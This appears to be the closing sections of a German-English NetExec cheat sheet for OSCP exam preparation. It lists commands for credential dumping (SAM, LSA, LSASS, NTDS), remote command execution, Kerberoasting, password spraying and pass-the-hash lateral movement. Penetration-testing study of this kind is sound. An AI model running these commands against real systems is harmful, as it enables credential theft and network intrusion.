nxc smb IP -u user -p pass --sessions
nxc smb IP -u user -p pass --loggedon-users
nxc smb IP -u user -p pass --pass-pol

# === CREDENTIAL DUMPING ===
nxc smb IP -u admin -p pass --sam
nxc smb IP -u admin -p pass --lsa
nxc smb IP -u admin -p pass --dpapi
nxc smb IP -u admin -p pass -M lsassy
nxc smb DC -u admin -p pass --ntds

# === EXECUTION ===
nxc smb IP -u admin -p pass -x whoami
nxc smb IP -u admin -p pass -X Get-Host
nxc winrm IP -u admin -p pass -x ipconfig
nxc mssql IP -u sa -p pass -x whoami

# === KERBEROS ATTACKS ===
nxc ldap DC -u user -p pass --asreproast asrep.txt
nxc ldap DC -u user -p pass --kerberoasting kerb.txt

# === MODULES ===
nxc smb -L  # List modules
nxc smb IP -u user -p pass -M spider_plus
nxc smb IP -u admin -p pass -M lsassy
nxc smb IP -u user -p pass -M enum_avproducts

# === DATABASE ===
nxc smb 192.168.1.0/24 --use-db-creds
nxc smb --export creds.csv
```

### 15.2 Protocol Cheat Sheet

| Protocol | Port | Use Case | Syntax |
|----------|------|----------|--------|
| SMB | 445 | File Shares, Command Exec | `nxc smb` |
| WinRM | 5985/5986 | PowerShell Remoting | `nxc winrm` |
| LDAP | 389/636 | AD Enumeration | `nxc ldap` |
| MSSQL | 1433 | SQL Server | `nxc mssql` |
| RDP | 3389 | Cred Validation | `nxc rdp` |
| SSH | 22 | Linux/Unix | `nxc ssh` |
| FTP | 21 | FTP | `nxc ftp` |
| VNC | 5900 | VNC | `nxc vnc` |
| NFS | 2049 | NFS | `nxc nfs` |

### 15.3 Important Flags

| Flag | Beschreibung |
|------|--------------|
| `-u` | Username (oder file) |
| `-p` | Password (oder file) |
| `-H` | NTLM Hash |
| `-d` | Domain |
| `--local-auth` | Local Admin |
| `-x` | CMD Command |
| `-X` | PowerShell Command |
| `-M` | Module |
| `--shares` | Shares |
| `--users` | Users |
| `--groups` | Groups |
| `--sessions` | Sessions |
| `--loggedon-users` | Logged-on Users |
| `--sam` | SAM Dump |
| `--lsa` | LSA Secrets |
| `--ntds` | NTDS.dit |
| `--dpapi` | DPAPI Secrets |
| `--pass-pol` | Password Policy |
| `--asreproast` | ASREPRoast |
| `--kerberoasting` | Kerberoast |
| `--continue-on-success` | Continue bei Success |
| `--use-db-creds` | Database Creds nutzen |
| `--gen-relay-list` | Relay Targets |
| `-t` | Threads |
| `--timeout` | Timeout |
| `--delay` | Delay zwischen Requests |
| `--jitter` | Random Jitter |
| `--exec-method` | Execution Method |

### 15.4 Module Quick Reference

| Module | Funktion |
|--------|----------|
| `spider_plus` | File Search |
| `lsassy` | LSASS Dump |
| `nanodump` | Stealthy LSASS |
| `handlekatz` | Handle Dump |
| `enum_avproducts` | AV Detection |
| `gpp_password` | GPP Passwords |
| `gpp_autologin` | Autologin Creds |
| `enum_trusts` | Domain Trusts |
| `enum_ca` | Certificate Authority |
| `adcs` | ADCS Enumeration |
| `zerologon` | Zerologon Check |
| `petitpotam` | PetitPotam Check |
| `nopac` | NoPac Check |
| `printnightmare` | PrintNightmare |

---

## 16. NetExec vs CME Summary

### 16.1 Warum NetExec?

**Vorteile:**
- ✅ Aktive Entwicklung (CME ist tot)
- ✅ 2x mehr Module
- ✅ Schneller (besseres Threading)
- ✅ Bessere OPSEC-Features
- ✅ Neue Vulnerability Checks
- ✅ Kürzerer Command (`nxc` vs `crackmapexec`)
- ✅ Bessere Output-Formatierung
- ✅ Mehr Protokolle (VNC, NFS, etc.)

**Migration:**
```bash
# 1. NetExec installieren
pipx install git+https://github.com/Pennyw0rth/NetExec

# 2. Alias setzen
alias cme='nxc'

# 3. Database kopieren (optional)
cp -r ~/.cme/workspaces/ ~/.nxc/workspaces/

# 4. Alle CME-Befehle funktionieren!
```

---

## 17. OSCP Tips

### 17.1 Exam-Safe Usage

```bash
# ✅ ERLAUBT: Password Spray
nxc smb 192.168.1.0/24 -u users.txt -p 'Password1!' --continue-on-success

# ❌ VERBOTEN: Bruteforce
nxc smb IP -u admin -p passwords.txt  # Nicht im Exam!

# IMMER Policy prüfen!
nxc smb DC -u user -p pass --pass-pol
```

### 17.2 Common Pitfalls

```bash
# Fehler 1: --local-auth vergessen
nxc smb IP -u administrator -p pass --local-auth  # ✅

# Fehler 2: Domain nicht angeben
nxc smb IP -u user -p pass -d CORP  # ✅

# Fehler 3: (Pwn3d!) ignorieren
# → Pwn3d! = Admin = SAM/LSA/LSASS dumpen!
```

### 17.3 Speed Tips

```bash
# Parallel Testing
for proto in smb winrm mssql; do
    nxc $proto 192.168.1.0/24 -u admin -H HASH --continue-on-success &
done
wait

# Auto-Pwn
nxc smb 192.168.1.0/24 -u admin -H HASH --sam | tee results.txt
```

---

## 18. Resources

- **NetExec GitHub**: https://github.com/Pennyw0rth/NetExec
- **NetExec Wiki**: https://www.netexec.wiki/
- **HackTricks - NetExec**: https://book.hacktricks.xyz/pentesting/pentesting-smb/netexec
- **OSCP Cheat Sheet**: https://github.com/0xsyr0/OSCP

---

## 19. Final Notes

**Für OSCP:**
- NetExec = Modernerer CrackMapExec Fork
- Alle CME-Befehle funktionieren (nur `nxc` statt `crackmapexec`)
- Mehr Features, schneller, aktiv entwickelt
- `(Pwn3d!)` = Admin = Win
- Immer Password Policy prüfen vor Spray!
- NTLM Hashes > Passwords (Pass-the-Hash!)

**Best Practice:**
1. `nxc smb 192.168.1.0/24` - Network Discovery
2. `nxc smb IP -u user -p pass` - Credential Validation
3. Alle Protokolle testen (smb/winrm/mssql/rdp)
4. Bei Pwn3d!: SAM/LSA/LSASS dumpen
5. Hashes für Lateral Movement nutzen
6. Database Creds automatisch testen: `--use-db-creds`
